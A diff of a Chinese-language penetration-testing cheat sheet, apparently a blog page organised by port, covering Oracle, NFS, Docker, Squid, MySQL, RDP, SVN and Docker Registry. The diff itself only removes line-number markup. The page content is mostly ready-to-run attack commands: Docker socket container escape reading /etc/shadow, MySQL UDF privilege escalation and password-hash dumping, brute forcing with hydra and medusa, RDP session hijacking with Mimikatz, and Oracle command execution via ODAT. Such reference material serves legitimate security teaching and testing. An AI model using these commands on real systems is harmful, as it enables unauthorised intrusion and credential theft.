 .&#x2F;odat.py dbmsscheduler -s &lt;IP&gt; -d &lt;SID&gt; -U &lt;username&gt; -P &lt;password&gt; --exec &quot;C:\windows\system32\cmd.exe &#x2F;c echo 123&gt;&gt;C:\hacK&quot;
 
 3）通过外部表执行代码
-.&#x2F;odat.py externaltable -s &lt;IP&gt; -U &lt;username&gt; -P &lt;password&gt; -d &lt;SID&gt; --exec &quot;C:&#x2F;windows&#x2F;system32&quot; &quot;calc.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+.&#x2F;odat.py externaltable -s &lt;IP&gt; -U &lt;username&gt; -P &lt;password&gt; -d &lt;SID&gt; --exec &quot;C:&#x2F;windows&#x2F;system32&quot; &quot;calc.exe&quot;</code></pre>
 
 <p>refer: </p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener">https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener</a></li>
 </ul>
-<h3 id="2049-NFS"><a href="#2049-NFS" class="headerlink" title="2049-NFS"></a>2049-NFS</h3><h4 id="指纹-x2F-配置"><a href="#指纹-x2F-配置" class="headerlink" title="指纹&#x2F;配置"></a>指纹&#x2F;配置</h4><pre class="line-numbers language-none"><code class="language-none">2049&#x2F;tcp open  nfs     2-3 (RPC #100003
+<h3 id="2049-NFS"><a href="#2049-NFS" class="headerlink" title="2049-NFS"></a>2049-NFS</h3><h4 id="指纹-x2F-配置"><a href="#指纹-x2F-配置" class="headerlink" title="指纹&#x2F;配置"></a>指纹&#x2F;配置</h4><pre class="language-none"><code class="language-none">2049&#x2F;tcp open  nfs     2-3 (RPC #100003
 
 &#x2F;etc&#x2F;exports
-&#x2F;etc&#x2F;lib&#x2F;nfs&#x2F;etab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="服务枚举-3"><a href="#服务枚举-3" class="headerlink" title="服务枚举"></a>服务枚举</h4><pre class="line-numbers language-none"><code class="language-none">nmap --script&#x3D;nfs-ls.nse,nfs-showmount.nse,nfs-statfs.nse -p 2049 &#123;IP&#125;
+&#x2F;etc&#x2F;lib&#x2F;nfs&#x2F;etab</code></pre>
+<h4 id="服务枚举-3"><a href="#服务枚举-3" class="headerlink" title="服务枚举"></a>服务枚举</h4><pre class="language-none"><code class="language-none">nmap --script&#x3D;nfs-ls.nse,nfs-showmount.nse,nfs-statfs.nse -p 2049 &#123;IP&#125;
 
-MSF: scanner&#x2F;nfs&#x2F;nfsmount #Scan NFS mounts and list permissions<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h4 id="挂载利用"><a href="#挂载利用" class="headerlink" title="挂载利用"></a>挂载利用</h4><pre class="line-numbers language-none"><code class="language-none">showmount -e &lt;IP&gt;   #列举可挂载文件夹
+MSF: scanner&#x2F;nfs&#x2F;nfsmount #Scan NFS mounts and list permissions</code></pre>
+<h4 id="挂载利用"><a href="#挂载利用" class="headerlink" title="挂载利用"></a>挂载利用</h4><pre class="language-none"><code class="language-none">showmount -e &lt;IP&gt;   #列举可挂载文件夹
 
 方式一：
 mount -t nfs [-o vers&#x3D;2] &lt;ip&gt;:&lt;remote_folder&gt; &lt;local_folder&gt; -o nolock
 
 方式二：
 mkdir &#x2F;mnt&#x2F;new_back
-mount -t nfs [-o vers&#x3D;2] 10.12.0.150:&#x2F;backup &#x2F;mnt&#x2F;new_back -o nolock<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+mount -t nfs [-o vers&#x3D;2] 10.12.0.150:&#x2F;backup &#x2F;mnt&#x2F;new_back -o nolock</code></pre>
 <h4 id="NFSShell"><a href="#NFSShell" class="headerlink" title="NFSShell"></a>NFSShell</h4><ul>
 <li><a target="_blank" rel="noopener" href="https://github.com/NetDirect/nfsshell">https://github.com/NetDirect/nfsshell</a></li>
 <li><a target="_blank" rel="noopener" href="https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/">https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/</a></li>
@@ -926,14 +926,14 @@ mount -t nfs [-o vers&#x3D;2] 10.12.0.150:&#x2F;backup &#x2F;mnt&#x2F;new_back -
 <h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><ul>
 <li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe">https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe</a></li>
 </ul>
-<h3 id="2375-2376-Docker"><a href="#2375-2376-Docker" class="headerlink" title="2375-2376: Docker"></a>2375-2376: Docker</h3><h4 id="服务枚举-4"><a href="#服务枚举-4" class="headerlink" title="服务枚举"></a>服务枚举</h4><pre class="line-numbers language-none"><code class="language-none">1）使用curl
+<h3 id="2375-2376-Docker"><a href="#2375-2376-Docker" class="headerlink" title="2375-2376: Docker"></a>2375-2376: Docker</h3><h4 id="服务枚举-4"><a href="#服务枚举-4" class="headerlink" title="服务枚举"></a>服务枚举</h4><pre class="language-none"><code class="language-none">1）使用curl
 
 curl -s http:&#x2F;&#x2F;open.docker.socket:2375&#x2F;version | jq #Get version
 
 2) 使用docker
 
-docker -H open.docker.socket:2375 version #Get version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="攻击利用-2"><a href="#攻击利用-2" class="headerlink" title="攻击利用"></a>攻击利用</h4><pre class="line-numbers language-none"><code class="language-none">1) 快速提权
+docker -H open.docker.socket:2375 version #Get version</code></pre>
+<h4 id="攻击利用-2"><a href="#攻击利用-2" class="headerlink" title="攻击利用"></a>攻击利用</h4><pre class="language-none"><code class="language-none">1) 快速提权
 
 docker run -it -v &#x2F;:&#x2F;host&#x2F; ubuntu:latest chroot &#x2F;host&#x2F; bash
 
@@ -981,9 +981,9 @@ docker run -it -v &#x2F;:&#x2F;host&#x2F; ubuntu:latest chroot &#x2F;host&#x2F; 
 3) 自动化
 
 msf&gt; use exploit&#x2F;linux&#x2F;http&#x2F;docker_daemon_tcp
-nmap -sV --script &quot;docker-*&quot; -p &lt;PORT&gt; &lt;IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="容器逃逸"><a href="#容器逃逸" class="headerlink" title="容器逃逸"></a>容器逃逸</h4><pre class="line-numbers language-none"><code class="language-none">docker -H &lt;host&gt;:2375 run --rm -it --privileged --net&#x3D;host -v &#x2F;:&#x2F;mnt alpine
-cat &#x2F;mnt&#x2F;etc&#x2F;shadow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+nmap -sV --script &quot;docker-*&quot; -p &lt;PORT&gt; &lt;IP&gt;</code></pre>
+<h4 id="容器逃逸"><a href="#容器逃逸" class="headerlink" title="容器逃逸"></a>容器逃逸</h4><pre class="language-none"><code class="language-none">docker -H &lt;host&gt;:2375 run --rm -it --privileged --net&#x3D;host -v &#x2F;:&#x2F;mnt alpine
+cat &#x2F;mnt&#x2F;etc&#x2F;shadow</code></pre>
 <p>refer: </p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting/2375-pentesting-docker">https://book.hacktricks.xyz/pentesting/2375-pentesting-docker</a></li>
@@ -992,14 +992,14 @@ cat &#x2F;mnt&#x2F;etc&#x2F;shadow<span aria-hidden="true" class="line-numbers-r
 <li><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py</a></li>
 <li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket">https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket</a></li>
 </ul>
-<h3 id="3128-Squid"><a href="#3128-Squid" class="headerlink" title="3128-Squid"></a>3128-Squid</h3><h4 id="服务指纹-3"><a href="#服务指纹-3" class="headerlink" title="服务指纹"></a>服务指纹</h4><pre class="line-numbers language-none"><code class="language-none">PORT     STATE  SERVICE      VERSION
-3128&#x2F;tcp open   http-proxy   Squid http proxy 4.11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h4 id="Web代理"><a href="#Web代理" class="headerlink" title="Web代理"></a>Web代理</h4><pre class="line-numbers language-none"><code class="language-none"># Try yo proxify curl
-curl --proxy http:&#x2F;&#x2F;10.10.11.131:3128 http:&#x2F;&#x2F;10.10.11.131<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h4 id="Nmap代理"><a href="#Nmap代理" class="headerlink" title="Nmap代理"></a>Nmap代理</h4><pre class="line-numbers language-none"><code class="language-none">proxichains.conf file: http 10.10.10.10 3128
+<h3 id="3128-Squid"><a href="#3128-Squid" class="headerlink" title="3128-Squid"></a>3128-Squid</h3><h4 id="服务指纹-3"><a href="#服务指纹-3" class="headerlink" title="服务指纹"></a>服务指纹</h4><pre class="language-none"><code class="language-none">PORT     STATE  SERVICE      VERSION
+3128&#x2F;tcp open   http-proxy   Squid http proxy 4.11</code></pre>
+<h4 id="Web代理"><a href="#Web代理" class="headerlink" title="Web代理"></a>Web代理</h4><pre class="language-none"><code class="language-none"># Try yo proxify curl
+curl --proxy http:&#x2F;&#x2F;10.10.11.131:3128 http:&#x2F;&#x2F;10.10.11.131</code></pre>
+<h4 id="Nmap代理"><a href="#Nmap代理" class="headerlink" title="Nmap代理"></a>Nmap代理</h4><pre class="language-none"><code class="language-none">proxichains.conf file: http 10.10.10.10 3128
 
-proxychains nmap -sT -n -p- localhost<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h3 id="3306-Mysql"><a href="#3306-Mysql" class="headerlink" title="3306-Mysql"></a>3306-Mysql</h3><h4 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h4><pre class="line-numbers language-none"><code class="language-none">1）本地连接
+proxychains nmap -sT -n -p- localhost</code></pre>
+<h3 id="3306-Mysql"><a href="#3306-Mysql" class="headerlink" title="3306-Mysql"></a>3306-Mysql</h3><h4 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h4><pre class="language-none"><code class="language-none">1）本地连接
 
 mysql -u root # Connect to root without password
 mysql -u root -p # A password will be asked (check someone)
@@ -1007,23 +1007,23 @@ mysql -u root -p # A password will be asked (check someone)
 2）远程连接
 
 mysql -h &lt;Hostname&gt; -u root
-mysql -h &lt;Hostname&gt; -u root@localhost<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="服务枚举-5"><a href="#服务枚举-5" class="headerlink" title="服务枚举"></a>服务枚举</h4><pre class="line-numbers language-none"><code class="language-none">nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 &lt;IP&gt;
+mysql -h &lt;Hostname&gt; -u root@localhost</code></pre>
+<h4 id="服务枚举-5"><a href="#服务枚举-5" class="headerlink" title="服务枚举"></a>服务枚举</h4><pre class="language-none"><code class="language-none">nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 &lt;IP&gt;
 msf&gt; use auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_version
 msf&gt; use auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_authbypass_hashdump
 msf&gt; use auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_hashdump 	#Creds
 msf&gt; use auxiliary&#x2F;admin&#x2F;mysql&#x2F;mysql_enum 				#Creds
 msf&gt; use auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_schemadump #Creds 
-msf&gt; use exploit&#x2F;windows&#x2F;mysql&#x2F;mysql_start_up 		#Execute commands Windows, Creds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="暴力破解-9"><a href="#暴力破解-9" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="line-numbers language-none"><code class="language-none"># hydra
+msf&gt; use exploit&#x2F;windows&#x2F;mysql&#x2F;mysql_start_up 		#Execute commands Windows, Creds</code></pre>
+<h4 id="暴力破解-9"><a href="#暴力破解-9" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="language-none"><code class="language-none"># hydra
 hydra -L usernames.txt -P pass.txt &lt;IP&gt; mysql
 
 # msfconsole
 msf&gt; use auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_login; set VERBOSE false
 
 # medusa
-medusa -h &lt;IP&#x2F;Host&gt; -u &lt;username&gt; -P &lt;password_list&gt; &lt;-f | to stop medusa on first success attempt&gt; -t &lt;threads&gt; -M mysql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><pre class="line-numbers language-none"><code class="language-none">show databases;
+medusa -h &lt;IP&#x2F;Host&gt; -u &lt;username&gt; -P &lt;password_list&gt; &lt;-f | to stop medusa on first success attempt&gt; -t &lt;threads&gt; -M mysql</code></pre>
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><pre class="language-none"><code class="language-none">show databases;
 use &lt;database&gt;;
 show tables;
 describe &lt;table_name&gt;;
@@ -1054,8 +1054,8 @@ FLUSH PRIVILEGES;
 quit;
 
 mysql -u username -p &lt; manycommands.sql   #A file with all the commands you want to execute
-mysql -u root -h 127.0.0.1 -e &#39;show databases;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="权限提升-1"><a href="#权限提升-1" class="headerlink" title="权限提升"></a>权限提升</h4><pre class="line-numbers language-none"><code class="language-none">1）Current Level of access
+mysql -u root -h 127.0.0.1 -e &#39;show databases;&#39;</code></pre>
+<h4 id="权限提升-1"><a href="#权限提升-1" class="headerlink" title="权限提升"></a>权限提升</h4><pre class="language-none"><code class="language-none">1）Current Level of access
 
 mysql&gt;select user();
 mysql&gt;select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user where user&#x3D;&#39;OUTPUT OF select user()&#39;;
@@ -1073,38 +1073,38 @@ mysql&gt; grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identifi
 4）Break into a shell
 
 mysql&gt; \! cat &#x2F;etc&#x2F;passwd
-mysql&gt; \! bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h4><pre class="line-numbers language-none"><code class="language-none"># locate lib_mysqludf_sys.so
+mysql&gt; \! bash</code></pre>
+<h4 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h4><pre class="language-none"><code class="language-none"># locate lib_mysqludf_sys.so
 
 use mysql;
 create table npn(line blob);
 insert into npn values(load_file(&#39;&#x2F;tmp&#x2F;lib_mysqludf_sys.so&#39;));
 select * from npn into dumpfile &#39;&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;lib_mysqludf_sys.so&#39;;
 create function sys_exec returns integer soname &#39;lib_mysqludf_sys.so&#39;;
-select sys_exec(&#39;id &gt; &#x2F;tmp&#x2F;out.txt&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="凭证获取"><a href="#凭证获取" class="headerlink" title="凭证获取"></a>凭证获取</h4><pre class="line-numbers language-none"><code class="language-none">SELECT User,Host,Password FROM mysql.user;
+select sys_exec(&#39;id &gt; &#x2F;tmp&#x2F;out.txt&#39;);</code></pre>
+<h4 id="凭证获取"><a href="#凭证获取" class="headerlink" title="凭证获取"></a>凭证获取</h4><pre class="language-none"><code class="language-none">SELECT User,Host,Password FROM mysql.user;
 SELECT User,Host,authentication_string FROM mysql.user;
 
-mysql -u root --password&#x3D;&lt;PASSWORD&gt; -e &quot;SELECT User,Host,authentication_string FROM mysql.user;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h4><pre class="line-numbers language-none"><code class="language-none">nmap --script&#x3D;mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse &#123;IP&#125; -p 3306
+mysql -u root --password&#x3D;&lt;PASSWORD&gt; -e &quot;SELECT User,Host,authentication_string FROM mysql.user;&quot;</code></pre>
+<h4 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h4><pre class="language-none"><code class="language-none">nmap --script&#x3D;mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse &#123;IP&#125; -p 3306
 
-msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_version; set RHOSTS &#123;IP&#125;; set RPORT 3306; run; exit&#39; &amp;&amp; msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_authbypass_hashdump; set RHOSTS &#123;IP&#125;; set RPORT 3306; run; exit&#39; &amp;&amp; msfconsole -q -x &#39;use auxiliary&#x2F;admin&#x2F;mysql&#x2F;mysql_enum; set RHOSTS &#123;IP&#125;; set RPORT 3306; run; exit&#39; &amp;&amp; msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_hashdump; set RHOSTS &#123;IP&#125;; set RPORT 3306; run; exit&#39; &amp;&amp; msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_schemadump; set RHOSTS &#123;IP&#125;; set RPORT 3306; run; exit&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_version; set RHOSTS &#123;IP&#125;; set RPORT 3306; run; exit&#39; &amp;&amp; msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_authbypass_hashdump; set RHOSTS &#123;IP&#125;; set RPORT 3306; run; exit&#39; &amp;&amp; msfconsole -q -x &#39;use auxiliary&#x2F;admin&#x2F;mysql&#x2F;mysql_enum; set RHOSTS &#123;IP&#125;; set RPORT 3306; run; exit&#39; &amp;&amp; msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_hashdump; set RHOSTS &#123;IP&#125;; set RPORT 3306; run; exit&#39; &amp;&amp; msfconsole -q -x &#39;use auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_schemadump; set RHOSTS &#123;IP&#125;; set RPORT 3306; run; exit&#39;</code></pre>
 <p>refer: </p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://github.com/carlospolop/legion">https://github.com/carlospolop/legion</a></li>
 <li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting/pentesting-mysql">https://book.hacktricks.xyz/pentesting/pentesting-mysql</a></li>
 <li><a target="_blank" rel="noopener" href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a></li>
 </ul>
-<h3 id="3389-RDP"><a href="#3389-RDP" class="headerlink" title="3389-RDP"></a>3389-RDP</h3><h4 id="服务指纹-4"><a href="#服务指纹-4" class="headerlink" title="服务指纹"></a>服务指纹</h4><pre class="line-numbers language-none"><code class="language-none">PORT     STATE SERVICE
-3389&#x2F;tcp open  ms-wbt-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h4 id="登录连接-1"><a href="#登录连接-1" class="headerlink" title="登录连接"></a>登录连接</h4><pre class="line-numbers language-none"><code class="language-none">rdesktop -u &lt;username&gt; &lt;IP&gt;
+<h3 id="3389-RDP"><a href="#3389-RDP" class="headerlink" title="3389-RDP"></a>3389-RDP</h3><h4 id="服务指纹-4"><a href="#服务指纹-4" class="headerlink" title="服务指纹"></a>服务指纹</h4><pre class="language-none"><code class="language-none">PORT     STATE SERVICE
+3389&#x2F;tcp open  ms-wbt-server</code></pre>
+<h4 id="登录连接-1"><a href="#登录连接-1" class="headerlink" title="登录连接"></a>登录连接</h4><pre class="language-none"><code class="language-none">rdesktop -u &lt;username&gt; &lt;IP&gt;
 rdesktop -d &lt;domain&gt; -u &lt;username&gt; -p &lt;password&gt; &lt;IP&gt;
 xfreerdp &#x2F;u:[domain\]&lt;username&gt; &#x2F;p:&lt;password&gt; &#x2F;v:&lt;IP&gt;
-xfreerdp &#x2F;u:[domain\]&lt;username&gt; &#x2F;pth:&lt;hash&gt; &#x2F;v:&lt;IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="暴力破解-10"><a href="#暴力破解-10" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="line-numbers language-none"><code class="language-none">ncrack -vv --user &lt;User&gt; -P pwds.txt rdp:&#x2F;&#x2F;&lt;IP&gt;
-hydra -V -f -L &lt;userslist&gt; -P &lt;passwlist&gt; rdp:&#x2F;&#x2F;&lt;IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h4 id="服务枚举-6"><a href="#服务枚举-6" class="headerlink" title="服务枚举"></a>服务枚举</h4><pre class="line-numbers language-none"><code class="language-none">nmap --script &quot;rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info&quot; -p 3389 -T4 &lt;IP&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h4 id="会话窃取"><a href="#会话窃取" class="headerlink" title="会话窃取"></a>会话窃取</h4><pre class="line-numbers language-none"><code class="language-none">1）获取打开的会话
+xfreerdp &#x2F;u:[domain\]&lt;username&gt; &#x2F;pth:&lt;hash&gt; &#x2F;v:&lt;IP&gt;</code></pre>
+<h4 id="暴力破解-10"><a href="#暴力破解-10" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="language-none"><code class="language-none">ncrack -vv --user &lt;User&gt; -P pwds.txt rdp:&#x2F;&#x2F;&lt;IP&gt;
+hydra -V -f -L &lt;userslist&gt; -P &lt;passwlist&gt; rdp:&#x2F;&#x2F;&lt;IP&gt;</code></pre>
+<h4 id="服务枚举-6"><a href="#服务枚举-6" class="headerlink" title="服务枚举"></a>服务枚举</h4><pre class="language-none"><code class="language-none">nmap --script &quot;rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info&quot; -p 3389 -T4 &lt;IP&gt;</code></pre>
+<h4 id="会话窃取"><a href="#会话窃取" class="headerlink" title="会话窃取"></a>会话窃取</h4><pre class="language-none"><code class="language-none">1）获取打开的会话
 query user
 
 2）访问所选会话
@@ -1112,21 +1112,21 @@ tscon &lt;ID&gt; &#x2F;dest:&lt;SESSIONNAME&gt;
 
 3）Mimikatz
 ts::sessions        #Get sessions
-ts::remote &#x2F;id:2    #Connect to the session<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+ts::remote &#x2F;id:2    #Connect to the session</code></pre>
 <p>refer:</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting/pentesting-rdp">https://book.hacktricks.xyz/pentesting/pentesting-rdp</a></li>
 <li><a target="_blank" rel="noopener" href="https://github.com/JoelGMSec/AutoRDPwn">https://github.com/JoelGMSec/AutoRDPwn</a></li>
 <li><a target="_blank" rel="noopener" href="https://github.com/linuz/Sticky-Keys-Slayer">https://github.com/linuz/Sticky-Keys-Slayer</a></li>
 </ul>
-<h3 id="3690-svn"><a href="#3690-svn" class="headerlink" title="3690-svn"></a>3690-svn</h3><h4 id="服务信息"><a href="#服务信息" class="headerlink" title="服务信息"></a>服务信息</h4><pre class="line-numbers language-none"><code class="language-none">PORT     STATE SERVICE
-3690&#x2F;tcp open  svnserve Subversion<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h4 id="Banner抓取-4"><a href="#Banner抓取-4" class="headerlink" title="Banner抓取"></a>Banner抓取</h4><pre class="line-numbers language-none"><code class="language-none">nc -vn &#123;host&#125; 3690<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h4 id="服务枚举-7"><a href="#服务枚举-7" class="headerlink" title="服务枚举"></a>服务枚举</h4><pre class="line-numbers language-none"><code class="language-none">svn ls svn:&#x2F;&#x2F;10.10.10.203 #list
+<h3 id="3690-svn"><a href="#3690-svn" class="headerlink" title="3690-svn"></a>3690-svn</h3><h4 id="服务信息"><a href="#服务信息" class="headerlink" title="服务信息"></a>服务信息</h4><pre class="language-none"><code class="language-none">PORT     STATE SERVICE
+3690&#x2F;tcp open  svnserve Subversion</code></pre>
+<h4 id="Banner抓取-4"><a href="#Banner抓取-4" class="headerlink" title="Banner抓取"></a>Banner抓取</h4><pre class="language-none"><code class="language-none">nc -vn &#123;host&#125; 3690</code></pre>
+<h4 id="服务枚举-7"><a href="#服务枚举-7" class="headerlink" title="服务枚举"></a>服务枚举</h4><pre class="language-none"><code class="language-none">svn ls svn:&#x2F;&#x2F;10.10.10.203 #list
 svn log svn:&#x2F;&#x2F;10.10.10.203 #Commit history
 svn checkout svn:&#x2F;&#x2F;10.10.10.203 #Download the repository
-svn up -r 2 #Go to revision 2 inside the checkout folder<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="5000-Docker-Registry"><a href="#5000-Docker-Registry" class="headerlink" title="5000-Docker Registry"></a>5000-Docker Registry</h3><h4 id="服务枚举-8"><a href="#服务枚举-8" class="headerlink" title="服务枚举"></a>服务枚举</h4><pre class="line-numbers language-none"><code class="language-none">#List repositories
+svn up -r 2 #Go to revision 2 inside the checkout folder</code></pre>
+<h3 id="5000-Docker-Registry"><a href="#5000-Docker-Registry" class="headerlink" title="5000-Docker Registry"></a>5000-Docker Registry</h3><h4 id="服务枚举-8"><a href="#服务枚举-8" class="headerlink" title="服务枚举"></a>服务枚举</h4><pre class="language-none"><code class="language-none">#List repositories
 curl -s http:&#x2F;&#x2F;10.10.10.10:5000&#x2F;v2&#x2F;_catalog
 &#123;&quot;repositories&quot;:[&quot;alpine&quot;,&quot;ubuntu&quot;]&#125;
 
@@ -1141,8 +1141,8 @@ curl -s http:&#x2F;&#x2F;192.251.36.3:5000&#x2F;v2&#x2F;ubuntu&#x2F;manifests&#x
 curl http:&#x2F;&#x2F;10.10.10.10:5000&#x2F;v2&#x2F;ubuntu&#x2F;blobs&#x2F;sha256:2a62ecb2a3e5bcdbac8b6edc58fae093a39381e05d08ca75ed27cae94125f935 --output blob1.tar
 
 #Inspect the insides of each blob
-tar -xf blob1.tar  #After this,inspect the new folders and files created in the current directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="Docker枚举"><a href="#Docker枚举" class="headerlink" title="Docker枚举"></a>Docker枚举</h4><pre class="line-numbers language-none"><code class="language-none">#Once you know which images the server is saving (&#x2F;v2&#x2F;_catalog) you can pull them
+tar -xf blob1.tar  #After this,inspect the new folders and files created in the current directory</code></pre>
+<h4 id="Docker枚举"><a href="#Docker枚举" class="headerlink" title="Docker枚举"></a>Docker枚举</h4><pre class="language-none"><code class="language-none">#Once you know which images the server is saving (&#x2F;v2&#x2F;_catalog) you can pull them
 docker pull ip:5000&#x2F;ubuntu
 
 #Check the commands used to create the layers of the image
@@ -1151,13 +1151,13 @@ docker history IP:5000&#x2F;ubuntu
 #Run and get a shell
 docker run -it IP:5000&#x2F;ubuntu bash  #Leave this shell running
 docker ps   #Using a different shell
-docker exec -it 7d3a81fe42d7 bash  #Get ash shell inside docker container<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
